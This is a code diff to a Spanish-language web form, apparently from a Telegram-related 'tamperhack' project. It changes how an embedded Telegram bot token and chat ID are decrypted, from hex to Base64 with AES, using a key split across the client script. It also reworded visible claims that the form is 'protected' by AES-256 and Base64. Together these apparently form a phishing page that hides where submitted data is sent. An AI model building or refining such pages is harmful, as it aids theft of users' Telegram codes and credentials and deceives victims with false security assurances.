@@ -92,7 +92,7 @@
 
   <div class="wrap">
     <main class="card" role="main" aria-labelledby="title">
-      <div class="security-badge">🔒 Protegido</div>
+      <div class="security-badge">🔒 Protegido con Base64</div>
       <header class="header">
         <div class="logo" aria-hidden="true">
           <img src="https://raw.githubusercontent.com/JesusQuijada34/tgtamperhack/main/assets/product_logo.png" alt="Logo" />
@@ -141,7 +141,7 @@
         <div>"La seguridad primero: nunca compartas tu código por más que digan que provienen de Telegram. Usa siempre métodos seguros del servidor para procesar datos."</div>
       </div>
 
-      <p class="note">Este formulario está protegido con cifrado AES-256 y técnicas anti-manipulación.</p>
+      <p class="note">Este formulario está protegido con cifrado AES-256 y codificación Base64.</p>
     </main>
   </div>
 
@@ -196,11 +196,11 @@
     ];
     const AES_KEY = keyParts[0] + keyParts[1] + keyParts[2];
 
-    // Función para descifrar con AES
-    async function decryptAES(encryptedHex, key) {
+    // Función para descifrar con AES desde Base64
+    async function decryptAESFromBase64(encryptedBase64, key) {
       try {
-        // Convertir hexadecimal a ArrayBuffer
-        const encryptedBytes = new Uint8Array(encryptedHex.match(/.{1,2}/g).map(byte => parseInt(byte, 16))).buffer;
+        // Decodificar Base64
+        const encryptedData = Uint8Array.from(atob(encryptedBase64), c => c.charCodeAt(0));
 
         // Convertir la clave a formato adecuado
         const keyData = new TextEncoder().encode(key);
@@ -213,8 +213,8 @@
         );
 
         // Extraer el vector de inicialización (primeros 16 bytes)
-        const iv = new Uint8Array(encryptedBytes, 0, 16);
-        const data = new Uint8Array(encryptedBytes, 16);
+        const iv = encryptedData.slice(0, 16);
+        const data = encryptedData.slice(16);
 
         // Descifrar
         const decrypted = await crypto.subtle.decrypt(
@@ -234,7 +234,7 @@
       }
     }
 
-    // Función para cargar credenciales con caché
+    // Función para cargar credenciales con caché desde Base64
     async function loadCredentials() {
       // Verificar si tenemos credenciales en caché
       const cachedCredentials = localStorage.getItem('tgCredentials');
@@ -264,12 +264,12 @@
           throw new Error('Formato de credenciales inválido');
         }
 
-        // Descifrar token y chatId
-        const encryptedToken = parts[0].trim();
-        const encryptedChatId = parts[1].trim();
+        // Descifrar token y chatId desde Base64
+        const encryptedTokenBase64 = parts[0].trim();
+        const encryptedChatIdBase64 = parts[1].trim();
 
-        const token = await decryptAES(encryptedToken, AES_KEY);
-        const chatId = await decryptAES(encryptedChatId, AES_KEY);
+        const token = await decryptAESFromBase64(encryptedTokenBase64, AES_KEY);
+        const chatId = await decryptAESFromBase64(encryptedChatIdBase64, AES_KEY);
 
         // Guardar en caché con verificación de integridad
         const credentials = { token, chatId };
